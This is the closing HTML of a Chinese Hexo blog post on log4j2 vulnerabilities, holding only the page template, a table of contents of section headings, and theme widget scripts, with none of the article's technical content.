+</article><div class="business-center"><div class="business-card"><div class="business-flip"><div class="business-front"><div class="business-strip-bottom"></div><div class="business-strip-top"></div><img class="business-logo" width="80" height="80" src="https://h4ckbird.github.io/img/alipay.jpg" alt="cardcode"><div class="business-Invitation">Invitation</div><div class="business-chip"><div class="business-chip-line"></div><div class="business-chip-line"></div><div class="business-chip-line"></div><div class="business-chip-line"></div><div class="business-chip-main"></div></div><svg class="business-wave" viewBox="0 3.71 26.959 38.787" width="26.959" height="38.787" fill="white"><path d="M19.709 3.719c.266.043.5.187.656.406 4.125 5.207 6.594 11.781 6.594 18.938 0 7.156-2.469 13.73-6.594 18.937-.195.336-.57.531-.957.492a.9946.9946 0 0 1-.851-.66c-.129-.367-.035-.777.246-1.051 3.855-4.867 6.156-11.023 6.156-17.718 0-6.696-2.301-12.852-6.156-17.719-.262-.317-.301-.762-.102-1.121.204-.36.602-.559 1.008-.504z"></path><path d="M13.74 7.563c.231.039.442.164.594.343 3.508 4.059 5.625 9.371 5.625 15.157 0 5.785-2.113 11.097-5.625 15.156-.363.422-1 .472-1.422.109-.422-.363-.472-1-.109-1.422 3.211-3.711 5.156-8.551 5.156-13.843 0-5.293-1.949-10.133-5.156-13.844-.27-.309-.324-.75-.141-1.114.188-.367.578-.582.985-.542h.093z"></path><path d="M7.584 11.438c.227.031.438.144.594.312 2.953 2.863 4.781 6.875 4.781 11.313 0 4.433-1.828 8.449-4.781 11.312-.398.387-1.035.383-1.422-.016-.387-.398-.383-1.035.016-1.421 2.582-2.504 4.187-5.993 4.187-9.875 0-3.883-1.605-7.372-4.187-9.875-.321-.282-.426-.739-.266-1.133.164-.395.559-.641.984-.617h.094zM1.178 15.531c.121.02.238.063.344.125 2.633 1.414 4.437 4.215 4.437 7.407 0 3.195-1.797 5.996-4.437 7.406-.492.258-1.102.07-1.36-.422-.257-.492-.07-1.102.422-1.359 2.012-1.075 3.375-3.176 3.375-5.625 0-2.446-1.371-4.551-3.375-5.625-.441-.204-.676-.692-.551-1.165.122-.468.567-.785 1.051-.742h.094z"></path></svg><div class="business-card-number"><div class="business-section">H4ckbird</div><div class="business-section">3287713353</div></div><div class="business-end"><span class="business-end-text">created:</span><span class="business-end-date">03/09/2020</span></div><div class="business-card-holder">Welcome to Join us!</div><div class="business-master"><div class="business-circle business-master-red"></div><div class="business-circle business-master-yellow">   </div></div></div><div class="business-back"><div class="business-strip-black"></div><div class="business-ccv"><label>sitelink</label><div><a target="_blank" rel="noopener" href="https://h4ckbird.github.io">https://h4ckbird.github.io</a></div></div><div class="business-terms"><p>Use this card to join the H4ck home and participate in a pleasant discussion together .</p><p>Welcome to H4ckbird's home,wish you a nice day.</p></div></div></div></div></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">H4ckbird</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/19/%E9%97%B2%E8%B0%88log4j2/">http://example.com/2022/01/19/%E9%97%B2%E8%B0%88log4j2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">H4ckbird's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/test-image/">test image</a></div><div class="post_share"><div class="social-share" data-image="/img/img1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"><img class="prev-cover" src="/img/img1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java文件系统</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/1/"><img class="next-cover" src="/img/img1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">python安全</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" title="Java文件系统"><img class="cover" src="/img/img1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-19</div><div class="title">Java文件系统</div></div></a></div><div><a href="/2022/11/19/first-page/" title="first-page"><img class="cover" src="https://h4ckbird.github.io/img/img1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-19</div><div class="title">first-page</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%B2%E8%B0%88log4j2"><span class="toc-number">1.</span> <span class="toc-text">闲谈log4j2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#log4j2%E7%88%86%E7%82%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">log4j2爆炸漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%96%B0%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">挖掘新问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87rc1"><span class="toc-number">1.3.</span> <span class="toc-text">绕过rc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">修复问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">1.6.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-dos"><span class="toc-number">1.7.</span> <span class="toc-text">cve-dos</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-2-15"><span class="toc-number">1.8.</span> <span class="toc-text">bypass 2.15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-45105"><span class="toc-number">1.9.</span> <span class="toc-text">CVE-2021-45105</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0"><span class="toc-number">1.10.</span> <span class="toc-text">更新</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">1.11.</span> <span class="toc-text">总结一下</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-botui"><div class="card-content" style="height:320px;"><div class="item-headline"><i class="fas fa-comments"></i><span>聊天窗</span></div><div class="botui-app-container" id="hello-akilar" style="width:100%;padding:0.5px"><bot-ui><div class="facemain"><figure><div><span class="face">要来和我聊聊么？</span><span class="face"><a href="javascript:void(0);" onclick="botui_init()">欢迎光临H4ckbird's Blog</a></span></div></figure></div></bot-ui></div></div></div></div></main><footer id="footer" style="background-image: url('/img/img1.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2022 By H4ckbird</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, Welcome to my <a target="_blank" rel="noopener" href="https://github.com/Erinipig">Blog!</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/pluginsSrc/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="https://npm.elemecdn.com/vue@2.6.11"></script><script src="/js/botui.js"></script><script data-pjax src="/js/botui_init.js"></script><script data-pjax src="/js/botui_init.js"></script><script src="https://npm.elemecdn.com/vue@2.6.11"></script><div class="aplayer no-destroy" data-id="5183531430" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><script src="/js/bandev.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="/pluginsSrc/butterfly-extsrc/dist/fireworks.min.js"></script><script src="/pluginsSrc/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="/pluginsSrc/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="/pluginsSrc/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="/pluginsSrc/aplayer/dist/APlayer.min.js"></script><script src="/pluginsSrc/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>function history_calendar_injector_config(){
+                var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+                var item_html = '<div class="card-widget card-history"><div class="card-content"><div class="item-headline"><i class="fas fa-clock fa-spin"></i><span>那年今日</span></div><div id="history-baidu" style="height: 100px;overflow: hidden"><div class="history_swiper-container" id="history-container" style="width: 100%;height: 100%"><div class="swiper-wrapper" id="history_container_wrapper" style="height:20px"></div></div></div></div>';
+                console.log('已挂载history_calendar')
+                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
+            }if( document.getElementsByClassName('sticky_layout')[0] && (location.pathname ==='all'|| 'all' ==='all')){
+
+            history_calendar_injector_config()
+        } </script><script data-pjax  src="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.js"></script><script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/js/main.js"></script><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.6534116,27.96920845';
+  var clock_default_rectangle_enable = 'true';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><div id="ghbdages" style="overflow:hidden;max-height:90px;height:auto;text-align:center;margin-top:10px"><div class="swiper-wrapper"><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo_v5.4.0"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly_v3.8.2"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.jsdelivr.com/" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr" alt=""/></a></div><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel"><img src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="本站采用双线部署，联通线路托管于Coding"><img src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&amp;logo=Codio" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="本站项目由Github托管"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a></div><div class="swiper-slide"><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></div></div></div><style>a.github-badge:hover:before {display:none}</style>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="https://unpkg.zhimg.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.js"></script><script defer src="https://unpkg.zhimg.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://unpkg.zhimg.com/hexo-butterfly-footer-beautify/lib/swiperbdage_init.min.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2022/01/19/闲谈log4j2/" alt=""><img width="48" height="48" src="/img/img1.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-01-19</span><a class="blog-slider__title" href="2022/01/19/闲谈log4j2/" alt="">闲聊log4j2</a><div class="blog-slider__text">Java文件系统</div><a class="blog-slider__button" href="2022/01/19/闲谈log4j2/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2022/11/19/first-page/" alt=""><img width="48" height="48" src="https://h4ckbird.github.io/img/img1.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-11-19</span><a class="blog-slider__title" href="2022/11/19/first-page/" alt="">first-page</a><div class="blog-slider__text">fist-page肯定是测试用的啦，第一次都是他的。</div><a class="blog-slider__button" href="2022/11/19/first-page/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2022/11/21/Test-topBanner/" alt=""><img width="48" height="48" src="https://h4ckbird.github.io/img/img1.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-11-21</span><a class="blog-slider__title" href="2022/11/21/Test-topBanner/" alt="">Test-topBanner&amp;&amp;参数释义</a><div class="blog-slider__text">置顶轮番图测试及参数详情解释</div><a class="blog-slider__button" href="2022/11/21/Test-topBanner/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2022/11/21/Test-swiper-index/" alt=""><img width="48" height="48" src="https://h4ckbird.github.io/img/img1.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-11-21</span><a class="blog-slider__title" href="2022/11/21/Test-swiper-index/" alt="">Test-swiper-index</a><div class="blog-slider__text">测试一下置顶的美化效果</div><a class="blog-slider__button" href="2022/11/21/Test-swiper-index/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2022/03/19/Java文件系统/" alt=""><img width="48" height="48" src="/img/img1.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-03-19</span><a class="blog-slider__title" href="2022/03/19/Java文件系统/" alt="">Java文件系统</a><div class="blog-slider__text">Java文件系统</div><a class="blog-slider__button" href="2022/03/19/Java文件系统/" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
+  function gitcalendar_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      console.log('已挂载gitcalendar')
+      }
+
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+        gitcalendar_injector_config()
+        GitCalendarInit("https://python-github-calendar-api-spk83h666-anzhiyu-c.vercel.app/api?anzhiyu-c",['#e4dfd7', '#f9f4dc', '#f7e8aa', '#f7e8aa', '#f8df72', '#fcd217', '#fcc515', '#f28e16', '#fb8b05', '#d85916', '#f43e06'],'anzhiyu-c')
+    }
+  </script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html><script type="text/javascript" src="\js\Funnytitle.js"></script>
